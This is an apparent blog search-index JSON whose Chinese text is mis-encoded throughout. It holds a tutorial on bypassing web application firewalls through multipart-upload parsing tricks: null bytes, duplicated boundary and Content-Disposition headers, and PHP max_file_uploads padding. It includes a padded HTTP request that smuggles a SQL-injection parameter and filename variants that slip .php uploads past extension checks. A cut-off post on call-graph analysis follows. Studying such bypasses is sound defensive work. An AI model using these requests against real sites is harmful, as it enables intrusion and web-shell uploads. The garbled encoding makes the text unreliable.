ç”±äºä¸€äº› WAF äº§å“å¯¹ç”¨æˆ·ä¸Šä¼ æ–‡ä»¶çš„å†…å®¹ä¸åšåŒ¹é…ï¼Œç›´æ¥æ”¾è¡Œã€‚å› æ­¤ï¼Œå…³é”®é—®é¢˜åœ¨äºï¼ŒWAF èƒ½å¦å‡†ç¡®æœ‰æ•ˆè¯†åˆ«å‡ºå“ªäº›å†…å®¹æ˜¯ä¼ ç»™ POST æ•°ç»„çš„ï¼Œå“ªäº›ä¼ ç»™ FILES æ•°ç»„ï¼Ÿå¦‚æœä¸èƒ½ï¼Œé‚£å°±å¯ä»¥æƒ³åŠæ³•è®© WAF ä»¥ä¸ºæˆ‘ä»¬æ˜¯åœ¨ä¸Šä¼ æ–‡ä»¶ï¼Œè€Œå®é™…ä¸Šå´æ˜¯åœ¨ POST ä¸€ä¸ªå‚æ•°ï¼Œè¿™ä¸ªå‚æ•°å¯ä»¥æ˜¯å‘½ä»¤æ³¨å…¥ã€SQL æ³¨å…¥ã€SSRF ç­‰ä»»æ„çš„ä¸€ç§æ”»å‡»ï¼Œè¿™æ ·å°±å®ç°äº†é€šç”¨å‹çš„ WAF Bypassã€‚ ","date":"2022-03-04","objectID":"/2022/03/waf-bypass/:0:0","tags":["æ¸—é€æµ‹è¯•"],"title":"WAF Bypass","uri":"/2022/03/waf-bypass/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"Bypass æ€è·¯ - åˆçº§ ","date":"2022-03-04","objectID":"/2022/03/waf-bypass/:1:0","tags":["æ¸—é€æµ‹è¯•"],"title":"WAF Bypass","uri":"/2022/03/waf-bypass/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"0x00 æˆªæ–­ åœ¨ filename ä¹‹å‰åŠ å…¥äº† 0x00 (%00 url decode)ï¼Œæœ‰äº› WAF åœ¨æ£€æµ‹å‰ä¼šå¯¹ HTTP åè®®ä¸­çš„ 0x00 è¿›è¡Œè¿‡æ»¤ï¼Œ è¿™æ ·å°±å¯¼è‡´äº† WAF è®¤ä¸ºæ˜¯å«æœ‰ filename çš„æ™®é€šä¸Šä¼ ï¼Œè€Œåç«¯ PHP åˆ™è®¤ä¸ºæ˜¯ POST å‚æ•°ã€‚ ","date":"2022-03-04","objectID":"/2022/03/waf-bypass/:1:1","tags":["æ¸—é€æµ‹è¯•"],"title":"WAF Bypass","uri":"/2022/03/waf-bypass/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"æ–‡ä»¶æè¿°åŒå†™æ··æ·† åŒå†™ Content-Dispositionï¼Œä¸€äº› WAF ä¼šå–ç¬¬äºŒè¡Œï¼Œè€Œå®é™… PHP ä¼šè·å–ç¬¬ä¸€è¡Œã€‚ å¦å¤–é’ˆå¯¹ Content-Disposition çš„åŒå†™æ··æ·†è¿˜æœ‰å¯ä»¥åŒ…æ‹¬ Content-Type: ä½†æ˜¯è¿™ç§æ–¹å¼ä¼šå°† f å˜é‡ä¸­åŠ å…¥ä¸€äº›åƒåœ¾æ•°æ®ï¼Œåœ¨è¿›è¡Œæ³¨å…¥æ—¶éœ€è¦è¿›è¡Œé—­åˆå¤„ç†ã€‚ ","date":"2022-03-04","objectID":"/2022/03/waf-bypass/:1:2","tags":["æ¸—é€æµ‹è¯•"],"title":"WAF Bypass","uri":"/2022/03/waf-bypass/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"multipart æ··æ·† é€šè¿‡æ„å»ºä¸€ä¸ªæ–°çš„ multipart éƒ¨åˆ†ï¼Œæ˜¯ä¸¤ä¸ªéƒ¨åˆ†ä¼ é€’çš„å‚æ•°åç›¸åŒï¼Œè¾¾åˆ°æ··æ·†çš„ç›®çš„ã€‚ å¸¦æœ‰åƒåœ¾æ•°æ®çš„æƒ…å†µ ä¸å¸¦åƒåœ¾æ•°æ®çš„æƒ…å†µ ","date":"2022-03-04","objectID":"/2022/03/waf-bypass/:1:3","tags":["æ¸—é€æµ‹è¯•"],"title":"WAF Bypass","uri":"/2022/03/waf-bypass/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"Boundary æ··æ·† æ„é€ åŒé‡ boundary åœ¨ PHP ä¸­ï¼Œåªè¯†åˆ«åˆ° boundary=aï¼Œå³çœŸæ­£çš„ boundary ä¸º aã€‚è‹¥ WAF ä¸­è¯†åˆ«åˆ°çš„ boundary ä¸º bï¼Œå°±ä¼šå°†ç¬¬ 13 è¡Œåˆ°ç¬¬ 18 è¡Œåšä¸ºæ–‡ä»¶ pic.png çš„å†…å®¹è¿›è¡Œä¼ è¾“ï¼Œè¾¾åˆ°æ··æ·†çš„ç›®çš„ã€‚ æ„é€ åŒé‡ Content-Type è¿™ç§æ··æ·†æ–¹å¼ä¸ä¸Šä¸€ç§æƒ…å†µç±»ä¼¼ï¼Œåªæ˜¯å°† Content-Type è¿›è¡Œæ··æ·†ï¼ŒæŒ‡å®šä¸åŒçš„ boundaryã€‚ ç©ºç™½ boundary åœ¨ PHP ä¸­ï¼Œåªè¯†åˆ«åˆ° boundary=ç©ºã€‚è‹¥ WAF ä¸­é”™å°† ; è¯†åˆ«åˆ°ä¸º boundaryï¼Œå°±ä¼šå°†ç¬¬ 13 è¡Œåˆ°ç¬¬ 18 è¡Œåšä¸ºæ–‡ä»¶ pic.png çš„å†…å®¹è¿›è¡Œä¼ è¾“ï¼Œè¾¾åˆ°æ··æ·†çš„ç›®çš„ã€‚ ç©ºæ ¼ boundary åŒæ ·çš„ boundary ä¹Ÿå¯ä»¥æ˜¯ç©ºæ ¼ boundary ä¸­çš„é€—å· äº‹å®ä¸Šï¼Œåœ¨ PHP ä¸­ä¼šå°† Boundary ä¸­çš„é€—å·ä½œä¸ºåˆ†éš”ç¬¦ï¼Œå³ boundary é‡åˆ°é€—å·å°±ç»“æŸã€‚ åªæ ‡è¯†ä¸€ä¸ªé€—å·ä¹Ÿå¯ä»¥ï¼š ","date":"2022-03-04","objectID":"/2022/03/waf-bypass/:1:4","tags":["æ¸—é€æµ‹è¯•"],"title":"WAF Bypass","uri":"/2022/03/waf-bypass/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"Bypass æ€è·¯ - è¿›é˜¶ ","date":"2022-03-04","objectID":"/2022/03/waf-bypass/:2:0","tags":["æ¸—é€æµ‹è¯•"],"title":"WAF Bypass","uri":"/2022/03/waf-bypass/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"0x00 æˆªæ–­è¿›é˜¶ è¿™ä¸‰ä¸ªä½ç½®éƒ½å¯ä»¥ã€‚å°†å…¶æ›¿æ¢ä¸º 0x00 å’Œ 0x20 ä¸ä¹‹åŒç†ã€‚ æ­¤å¤–ï¼Œå°† 0x00 æ”¾åˆ°å‚æ•°åä¸­ä¹Ÿå¯ä»¥ç»•è¿‡ï¼š ","date":"2022-03-04","objectID":"/2022/03/waf-bypass/:2:1","tags":["æ¸—é€æµ‹è¯•"],"title":"WAF Bypass","uri":"/2022/03/waf-bypass/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"Boundary æ··æ·†è¿›é˜¶ boundary çš„åç§°æ˜¯å¯ä»¥å‰ååŠ å…¥ä»»æ„å†…å®¹çš„ï¼ŒWAF å¦‚æœä¸¥æ ¼æŒ‰ boundary å»å–ï¼Œå°±ä¼šå‡ºç°æ··æ·†ã€‚ åœ¨åŒå†™ Content-Type çš„æ··æ·†ä¸­ï¼Œå°†ç¬¬ä¸€ä¸ª Content-Type å’Œå†’å·éƒ¨åˆ†å¡«å…¥äº†ç©ºæ ¼ï¼Œå®ç°ç»•è¿‡ã€‚ Boundary çš„å–å€¼æ··æ·†ï¼š ","date":"2022-03-04","objectID":"/2022/03/waf-bypass/:2:2","tags":["æ¸—é€æµ‹è¯•"],"title":"WAF Bypass","uri":"/2022/03/waf-bypass/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"å•åŒå¼•å·æ··åˆ Content-Disposition ä¸­çš„å­—æ®µä½¿ç”¨å•å¼•å·ã€åŒå¼•å·è¿›è¡Œæ··æ·† ","date":"2022-03-04","objectID":"/2022/03/waf-bypass/:2:3","tags":["æ¸—é€æµ‹è¯•"],"title":"WAF Bypass","uri":"/2022/03/waf-bypass/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"urlencoded ä¸ multipart æ··æ·† åœ¨ Content-Type å¤´ä¸­ï¼Œåˆ†åˆ«æŒ‡å®šä¸ºï¼šurlencoded ä¸ multipartã€‚å®é™…ä¸Š PHP è¯†åˆ«åˆ°çš„ä¸º urlencodedï¼Œè‹¥ WAF è¯†åˆ«åˆ°çš„ä¸º multipartï¼Œå°±å¯ä»¥ç»•è¿‡æ£€æµ‹ã€‚é€šè¿‡ \u0026 æ¥ä½œä¸ºå‚æ•°åˆ†éš”ç¬¦ï¼Œæˆªå–å‚æ•° sqlInjectionParam çš„å‰åéƒ¨åˆ†ï¼Œå®Œæ•´ä¿ç•™è¯¥å‚æ•°ã€‚ ç”±äº multipart/form-data ä¸‹çš„å†…å®¹ä¸è¿›è¡Œ urldecodedï¼Œ ä¸€äº› WAF ä¹Ÿæ­£æ˜¯è¿™æ ·è®¾è®¡çš„ï¼Œè¿™æ ·åšæœ¬æ²¡æœ‰é—®é¢˜ï¼Œä½†æ˜¯å¦‚æœæ˜¯ urlencoded æ ¼å¼çš„å†…å®¹ï¼Œä¸è¿›è¡Œ url è§£ç å°±ä¼šå¼•å…¥ %0a è¿™æ ·å­—ç¬¦ï¼Œè€Œè¿™æ ·çš„å­—ç¬¦ä¸è§£ç æ˜¯å¯ä»¥ç›´æ¥ç»•è¿‡é˜²æŠ¤è§„åˆ™çš„ï¼Œä»è€Œå¯¼è‡´äº†ç»•è¿‡ã€‚ ","date":"2022-03-04","objectID":"/2022/03/waf-bypass/:2:4","tags":["æ¸—é€æµ‹è¯•"],"title":"WAF Bypass","uri":"/2022/03/waf-bypass/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"Bypass æ€è·¯ - é«˜çº§ æ­¤ç« èŠ‚é€šè¿‡ç»“åˆ PHP æºç æ¥è®¨è®º WAF Bypass çš„å¯èƒ½æ€§ã€‚ ","date":"2022-03-04","objectID":"/2022/03/waf-bypass/:3:0","tags":["æ¸—é€æµ‹è¯•"],"title":"WAF Bypass","uri":"/2022/03/waf-bypass/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"skip_upload - 1 åœ¨ PHP æºç ä¸­ï¼Œå¤„ç† multipart æ—¶å­˜åœ¨è¿™æ ·ä¸€æ®µä»£ç ï¼š å…¶ä¸­çš„ param å°±æ˜¯ name=\"f\"ï¼Œå½“ç¨‹åºè¿›å…¥ c \u003c 0 è¿™ä¸ªåˆ†æ”¯æ—¶ï¼Œå°±ä¼šè·³è¿‡å½“å‰ part çš„ä¸Šä¼ æµç¨‹ã€‚ç”±äºåˆå§‹åŒ–æ—¶ c = 0ï¼Œé‡åˆ° [ æ—¶ï¼Œc += 1ï¼Œé‡åˆ° ] æ—¶ï¼Œc -= 1ã€‚å› æ­¤ï¼Œå¯ä»¥æ„é€  name=\"f]\"ï¼Œå³å¯è®© c = -1ã€‚ ","date":"2022-03-04","objectID":"/2022/03/waf-bypass/:3:1","tags":["æ¸—é€æµ‹è¯•"],"title":"WAF Bypass","uri":"/2022/03/waf-bypass/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"skip_upload - 2 åœ¨ PHP æºç ä¸­ï¼Œæœ‰è¿™æ ·ä¸€æ®µä»£ç ï¼š å½“æ–‡ä»¶ä¸Šä¼ æ•°é‡è¶…å‡ºæœ€å¤§å€¼åï¼Œä¼šè·³è¿‡å½“å‰ part æ–‡ä»¶çš„å¤„ç†ã€‚åœ¨ php 5.2.12 å’Œä»¥ä¸Šçš„ç‰ˆæœ¬ï¼Œæœ‰ä¸€ä¸ªéšè—çš„æ–‡ä»¶ä¸Šä¼ é™åˆ¶æ˜¯åœ¨ php.ini é‡Œæ²¡æœ‰çš„ï¼Œå°±æ˜¯è¿™ä¸ª max_file_uploads çš„è®¾å®šï¼Œè¯¥é»˜è®¤å€¼æ˜¯ 20, åœ¨ php 5.2.17 çš„ç‰ˆæœ¬ä¸­è¯¥å€¼å·²ä¸å†éšè—ã€‚æ–‡ ä»¶ä¸Šä¼ é™åˆ¶æœ€å¤§é»˜è®¤è®¾ä¸º 20ï¼Œæ‰€ä»¥ä¸€æ¬¡ä¸Šä¼ æœ€å¤§å°±æ˜¯ 20 ä¸ªæ–‡æ¡£ï¼Œæ‰€ä»¥è¶…å‡º 20 ä¸ªå°±ä¼šæŠ¥é”™ã€‚ POST /waf.php HTTP/1.1 Accept: */* Host: localhost:8081 Accept-Encoding: gzip, deflate Connection: close Content-Type: multipart/form-data; boundary=a Content-Length: 2030 --a Content-Disposition: form-data; name=\"1\"; filename=\"pic.png\" Content-Type: image/png 1 --a Content-Disposition: form-data; name=\"2\"; filename=\"pic.png\" Content-Type: image/png 2 --a Content-Disposition: form-data; name=\"3\"; filename=\"pic.png\" Content-Type: image/png 3 --a Content-Disposition: form-data; name=\"4\"; filename=\"pic.png\" Content-Type: image/png 3 --a Content-Disposition: form-data; name=\"5\"; filename=\"pic.png\" Content-Type: image/png 3 --a Content-Disposition: form-data; name=\"6\"; filename=\"pic.png\" Content-Type: image/png 3 --a Content-Disposition: form-data; name=\"7\"; filename=\"pic.png\" Content-Type: image/png 3 --a Content-Disposition: form-data; name=\"8\"; filename=\"pic.png\" Content-Type: image/png 3 --a Content-Disposition: form-data; name=\"9\"; filename=\"pic.png\" Content-Type: image/png 3 --a Content-Disposition: form-data; name=\"10\"; filename=\"pic.png\" Content-Type: image/png 3 --a Content-Disposition: form-data; name=\"11\"; filename=\"pic.png\" Content-Type: image/png 3 --a Content-Disposition: form-data; name=\"12\"; filename=\"pic.png\" Content-Type: image/png 3 --a Content-Disposition: form-data; name=\"13\"; filename=\"pic.png\" Content-Type: image/png 3 --a Content-Disposition: form-data; name=\"14\"; filename=\"pic.png\" Content-Type: image/png 3 --a Content-Disposition: form-data; name=\"15\"; filename=\"pic.png\" Content-Type: image/png 3 --a Content-Disposition: form-data; name=\"16\"; filename=\"pic.png\" Content-Type: image/png 3 --a Content-Disposition: form-data; name=\"17\"; filename=\"pic.png\" Content-Type: image/png 3 --a Content-Disposition: form-data; name=\"18\"; filename=\"pic.png\" Content-Type: image/png 3 --a Content-Disposition: form-data; name=\"19\"; filename=\"pic.png\" Content-Type: image/png 3 --a Content-Disposition: form-data; name=\"id\"; filename=\"pic.png\" Content-Type: image/png 3 --a Content-Disposition: form-data; name=\"id\"; sql injection!!!! --a-- ","date":"2022-03-04","objectID":"/2022/03/waf-bypass/:3:2","tags":["æ¸—é€æµ‹è¯•"],"title":"WAF Bypass","uri":"/2022/03/waf-bypass/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"å…³äºæ–‡ä»¶æ‰©å±•åçš„ç»•è¿‡ å‰æ–‡ä¸»è¦æ˜¯æå‡ºä¸€äº›å…³äºæºç«™ä¸ WAF åœ¨è§£æ multipart ä¹‹é—´å­˜åœ¨çš„å·®å¼‚å¯¼è‡´çš„ç»•è¿‡ã€‚åœ¨å®é™…æ¸—é€æµ‹è¯•ä¸­ï¼Œå¦‚ä½•ç»•è¿‡æ–‡ä»¶æ‰©å±•åæ˜¯å¾ˆé‡è¦ä¸€ä¸ªç‚¹ï¼Œæ‰€ä»¥æœ¬èŠ‚å†…å®¹ä¸»è¦ä»‹ç»ï¼Œåœ¨ WAF è§£æåˆ° filename å‚æ•°çš„æƒ…å†µä¸‹ï¼Œä»åè®®å’Œåç«¯è§£æçš„å±‚é¢å¦‚ä½•ç»•è¿‡æ–‡ä»¶æ‰©å±•åã€‚ æ•´ä½“ä¸Šçš„æ€è·¯ä¸ºï¼šfilename=\"file_name.php\"ï¼Œå¯¹äº WAF å±‚é¢æ¥è¯´ï¼Œå‘ç°æ‰©å±•åä¸º phpï¼Œæ¥ç€è¿›è¡Œæ‹¦æˆªï¼Œç»•è¿‡çš„ç›®æ ‡ä¸ºï¼Œä½¿ WAF è§£æå‡ºçš„ filename ä¸å‡ºç° php å…³é”®å­—ï¼Œå¹¶ä¸”åç«¯ç¨‹åºåœ¨éªŒè¯æ‰©å±•åçš„æ—¶å€™ä¼šè®¤ä¸ºè¿™æ˜¯ä¸€ä¸ª php æ–‡ä»¶ã€‚ ä»å„ç§ç¨‹åºè§£æçš„ä»£ç æ¥çœ‹ï¼Œä¸ºäº†è®© waf è§£æå‡ºç°é—®é¢˜ï¼Œå¹²æ‰°çš„å­—ç¬¦é™¤äº†ä¸Šæ–‡è¯´çš„å¼•å·ï¼Œç©ºæ ¼ï¼Œè½¬ä¹‰ç¬¦ï¼Œè¿˜æœ‰ :;ï¼Œè¿™é‡Œè¿˜æ˜¯è¦åˆ†ä¸ºä¸¤ç§å½¢å¼çš„æµ‹è¯•ã€‚ æ— å¼•å·åŒ…è£¹çš„å½¢å¼ Content-Disposition: form-data; name=key3; filename=file_name:.php Content-Disposition: form-data; name=key3; filename=file_name'.php Content-Disposition: form-data; name=key3; filename=file_name\".php Content-Disposition: form-data; name=key3; filename=file_name\\\".php Content-Disposition: form-data; name=key3; filename=file_name .php Content-Disposition: form-data; name=key3; filename=file_name;.php å‰äº”ç§æƒ…å†µ flask/Java è§£æç»“æœéƒ½æ˜¯ä¸€è‡´çš„ï¼Œä¼šå–æ•´ä½“ä½œä¸º filename çš„å€¼ï¼Œéƒ½æ˜¯å«æœ‰ php å…³é”®å­—çš„ï¼Œè¿™ä¹Ÿè¯´æ˜å¦‚æœ waf è§£æå­˜åœ¨å·®å¼‚ï¼Œå°†ç‰¹æ®Šå­—ç¬¦ç›´æ¥æˆªæ–­å–å€¼ï¼Œä¼šå¯¼è‡´ waf è¢«ç»•è¿‡ã€‚ æœ€åä¸€ç§æƒ…å†µï¼Œflask/Java/php è§£æéƒ½ä¼šç›´æ¥æˆªæ–­ï¼Œfilename=file_nameï¼Œè¿™æ ·åç«¯è·å–ä¸äº†ï¼Œæ— è®º waf è§£ææ–¹å¼å¦‚ä½•ï¼Œæ— æ³•ç»•è¿‡ã€‚ å¯¹äº php è€Œè¨€ï¼Œå‰ä¸‰ç§ä¼šå¦‚ flask ä»¥ä¸€æ ·ï¼Œå°†æ•´ä½“ä½œä¸º filename çš„å€¼ï¼Œç¬¬äº”ç§ç©ºæ ¼ç±»å‹ï¼Œphp ä¼šæˆªæ–­ï¼Œæœ€ç»ˆå– filename=file_nameï¼Œè¿™ç§å®¹æ˜“ç†è§£ï¼Œå½“æ²¡å‡ºç°å¼•å·æ—¶ï¼Œå‡ºç°ç©ºæ ¼ï¼Œå³è®¤ä¸ºå‚æ•°å€¼ç»“æŸã€‚ ç„¶åå†æµ‹è¯•è½¬ä¹‰ç¬¦å·çš„æ—¶å€™ï¼Œå‡ºç°äº†ä» \\ å¼€å§‹æˆªæ–­ï¼Œå¹¶å» \\ åé¢çš„å€¼æœ€ä¸º filenameçš„å€¼ï¼Œè¿™ç§è§£ææ–¹å¼å’Œ boundary è§£æä¹Ÿä¸ç›¸åŒï¼Œä¸”åŒå¼•å·å’Œå•å¼•å·ç›¸åŒæ•ˆæœã€‚å®é™…ä¸Š php å¹¶æ²¡æœ‰æŠŠ \\ å½“ä½œè½¬ä¹‰ç¬¦å·ï¼Œè€Œæ˜¯å°† filename å‚æ•°çœ‹å½“åšæ–‡ä»¶è·¯å¾„ï¼Œå¹¶å–å‡º path é‡Œé¢æ–‡ä»¶åçš„éƒ¨åˆ†ã€‚æ‰€ä»¥è¿™ä¸ªè§£ææ–¹å¼å’Œå¼•å·è·Ÿæœ¬æ²¡å…³ç³»ï¼Œåªæ˜¯ php åœ¨è§£æ filename æ—¶ï¼Œä¼šå–æœ€åçš„ \\ æˆ–è€… / åé¢çš„å€¼ä½œä¸ºæ–‡ä»¶åã€‚ æœ‰å¼•å·åŒ…è£¹çš„å½¢å¼ Content-Disposition: form-data; name=f; filename=\"file_name:.php\" Content-Disposition: form-data; name=f; filename=\"file_name'.php\" Content-Disposition: form-data; name=f; filename=\"file_name\".php\" Content-Disposition: form-data; name=f; filename=\"file_name\\\".php\" Content-Disposition: form-data; name=f; filename=\"file_name .php\" Content-Disposition: form-data; name=f; filename=\"file_name;.php\" flask è§£æç»“æœé™¤ç¬¬ä¸‰ç§ filename å– file_name ä¹‹å¤–ï¼Œå…¶å®ƒéƒ½ä¼šå–åŒå¼•å·å†…æ•´ä½“çš„å€¼ä½œä¸º filenameï¼Œè½¬ä¹‰ç¬¦å…·æœ‰è½¬ä¹‰ä½œç”¨ã€‚php ç¬¬ä¸‰ç§ä¹Ÿä¼šè§£æå‡º file_nameï¼Œä½†æ˜¯åœ¨ç¬¬å››ç§è½¬ä¹‰ç¬¦æ˜¯å…·æœ‰è½¬ä¹‰ä½œç”¨çš„ã€‚ä½¿ç”¨å•å¼•å·çš„æƒ…å†µå’Œä¸Šæ–‡å¼•å·éƒ¨åˆ†åˆ†æä¸€è‡´ã€‚ å¯¹äº Java æ¥è¯´ï¼Œé™¤ç¬¬ä¸‰ç§æƒ…å†µå¤–ï¼Œéƒ½æ˜¯ä¼šå–å¼•å·å†…æ•´ä½“ä½œä¸º filename å€¼ï¼Œä½†æ˜¯ç¬¬ä¸‰ç§æƒ…å†µ Java ä¼šç»§ç»­å–å€¼ï¼Œé‚£ä¹ˆæœ€å filename ä¸º file_name\".phpã€‚æ‰€ä»¥å¯¹äº Java è¿™ä¸ªå¼‚å¸¸çš„ç‰¹æ€§æ¥è¯´ï¼Œé€šå¸¸ WAF ä¼šåƒ php/flask é‚£æ ·åœ¨ç¬¬ä¸€æ¬¡å‡ºç°é—­åˆåŒå¼•å·æ—¶ï¼Œç›´æ¥å–åŒå¼•å·å†…å†…å®¹ä½œä¸º filename çš„å–å€¼ï¼Œè¿™æ ·å°±å¯ä»¥ç»•è¿‡æ–‡ä»¶æ‰©å±•åçš„æ£€æµ‹ã€‚ ","date":"2022-03-04","objectID":"/2022/03/waf-bypass/:4:0","tags":["æ¸—é€æµ‹è¯•"],"title":"WAF Bypass","uri":"/2022/03/waf-bypass/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"å‚è€ƒ do9gy - è…¾è®¯ WAF æŒ‘æˆ˜å›å¿†å½• donky16 - ä» RFC çœ‹å¦‚ä½•é€šè¿‡ multipart æ–‡ä»¶ä¸Šä¼ ç»•è¿‡ WAF ","date":"2022-03-04","objectID":"/2022/03/waf-bypass/:5:0","tags":["æ¸—é€æµ‹è¯•"],"title":"WAF Bypass","uri":"/2022/03/waf-bypass/"},{"categories":["é™æ€ç¨‹åºåˆ†æ"],"content":"é™æ€ç¨‹åºåˆ†æ(äºŒ) - è¿‡ç¨‹é—´åˆ†æ","date":"2022-02-17","objectID":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%BA%8C/","tags":["é™æ€ç¨‹åºåˆ†æ"],"title":"é™æ€ç¨‹åºåˆ†æç³»åˆ—(äºŒ)","uri":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%BA%8C/"},{"categories":["é™æ€ç¨‹åºåˆ†æ"],"content":"é™æ€ç¨‹åºåˆ†æ(äºŒ) ","date":"2022-02-17","objectID":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%BA%8C/:0:0","tags":["é™æ€ç¨‹åºåˆ†æ"],"title":"é™æ€ç¨‹åºåˆ†æç³»åˆ—(äºŒ)","uri":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%BA%8C/"},{"categories":["é™æ€ç¨‹åºåˆ†æ"],"content":"1 è°ƒç”¨å›¾ï¼šCall Graph Construction ","date":"2022-02-17","objectID":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%BA%8C/:1:0","tags":["é™æ€ç¨‹åºåˆ†æ"],"title":"é™æ€ç¨‹åºåˆ†æç³»åˆ—(äºŒ)","uri":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%BA%8C/"},{"categories":["é™æ€ç¨‹åºåˆ†æ"],"content":"1.1 æ¦‚å¿µ æœ¬è´¨ä¸Šæ¥è¯´ï¼Œä¸€ä¸ªè°ƒç”¨å›¾å°±æ˜¯ä»è°ƒç”¨ç‚¹åˆ°ç›®æ ‡æ–¹æ³•(callee)çš„ä¸€ç³»åˆ—è°ƒç”¨è¾¹ã€‚ ç¨‹åºè°ƒç”¨å›¾æ˜¯è¿‡ç¨‹é—´åˆ†æçš„åŸºç¡€ï¼Œå¯ä»¥ç”¨äºç¨‹åºä¼˜åŒ–ã€ç†è§£ã€è°ƒè¯•ã€æµ‹è¯•ç­‰ã€‚ ","date":"2022-02-17","objectID":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%BA%8C/:1:1","tags":["é™æ€ç¨‹åºåˆ†æ"],"title":"é™æ€ç¨‹åºåˆ†æç³»åˆ—(äºŒ)","uri":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%BA%8C/"},{"categories":["é™æ€ç¨‹åºåˆ†æ"],"content":"1.2 åˆ†ç±» Call Graph æœ‰å¾ˆå¤šç§ä¸åŒçš„æ„é€ æ–¹æ³•ï¼Œæœ¬æ–‡æ¥ä¸‹æ¥ä¼šè®²è§£ä¸¤ä¸ªæç«¯ï¼šæœ€å‡†ç¡®çš„å’Œæœ€å¿«é€Ÿçš„ã€‚ è°ƒç”¨å›¾æ„é€ ä¸»è¦ä½œç”¨äºé¢å‘å¯¹è±¡è¯­è¨€ï¼Œå³ä»¥ Java ä¸ºä»£è¡¨çš„ï¼Œé¢å‘å¯¹è±¡çš„è¯­è¨€ã€‚ä¸€èˆ¬ç”¨åˆ°å¦‚å›¾å››ç§ç®—æ³•ï¼Œå…¶ä¸­ CHA æ˜¯æœ€å¿«çš„ï¼ŒæŒ‡é’ˆåˆ†æ K-CHA æ˜¯æœ€å‡†çš„ï¼Œæœ¬æ–‡ä¸»è¦å°† CHAï¼Œåé¢çš„æ–‡ç« ä¼šè®²æŒ‡é’ˆåˆ†æã€‚ ","date":"2022-02-17","objectID":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%BA%8C/:1:2","tags":["é™æ€ç¨‹åºåˆ†æ"],"title":"é™æ€ç¨‹åºåˆ†æç³»åˆ—(äºŒ)","uri":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%BA%8C/"},{"categories":["é™æ€ç¨‹åºåˆ†æ"],"content":"1.3 Java ä¸­çš„æ–¹æ³•è°ƒç”¨å½¢å¼ Instructionï¼šæŒ‡ Java çš„ IR ä¸­çš„æŒ‡ä»¤ Receiver objectsï¼šæ–¹æ³•è°ƒç”¨å¯¹åº”çš„å®ä¾‹å¯¹è±¡ï¼ˆstatic æ–¹æ³•è°ƒç”¨ä¸éœ€è¦å¯¹åº”å®ä¾‹ï¼‰ã€‚ Target methodsï¼šè¡¨ç¤º IR æŒ‡ä»¤åˆ°è¢«è°ƒç”¨ç›®æ ‡æ–¹æ³•çš„æ˜ å°„å…³ç³» Num of target methodsï¼šcall å¯¹åº”çš„å¯èƒ½è¢«è°ƒç”¨çš„ç›®æ ‡æ–¹æ³•çš„æ•°é‡ã€‚Virtual call ä¸åŠ¨æ€ç»‘å®šå’Œå¤šæ€å®ç°æœ‰å…³ï¼Œå¯ä»¥å¯¹åº”å¤šä¸ªå¯¹è±¡ä¸‹çš„é‡å†™æ–¹æ³•ã€‚æ‰€ä»¥ Virtual call çš„å¯èƒ½å¯¹è±¡å¯èƒ½è¶…è¿‡ 1 ä¸ªã€‚ Determinacyï¼šæŒ‡ä»€ä¹ˆæ—¶å€™èƒ½å¤Ÿç¡®å®šè¿™ä¸ª call çš„å¯¹åº”æ–¹æ³•ã€‚Virtual call ä¸å¤šæ€æœ‰å…³ï¼Œåªèƒ½åœ¨è¿è¡Œæ—¶å†³å®šè°ƒç”¨å“ªä¸€ä¸ªå…·ä½“æ–¹æ³•çš„å®ç°ã€‚å…¶ä»–ä¸¤ç§ call éƒ½å’Œå¤šæ€æœºåˆ¶ä¸ç›¸å…³ï¼Œç¼–è¯‘æ—¶åˆ»å°±å¯ä»¥ç¡®å®šã€‚ ","date":"2022-02-17","objectID":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%BA%8C/:1:3","tags":["é™æ€ç¨‹åºåˆ†æ"],"title":"é™æ€ç¨‹åºåˆ†æç³»åˆ—(äºŒ)","uri":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%BA%8C/"},{"categories":["é™æ€ç¨‹åºåˆ†æ"],"content":"1.4 Virtual Callçš„æ–¹æ³•è°ƒåº¦å‡½æ•° (Dispatch) Virtual call æ˜¯å‡ 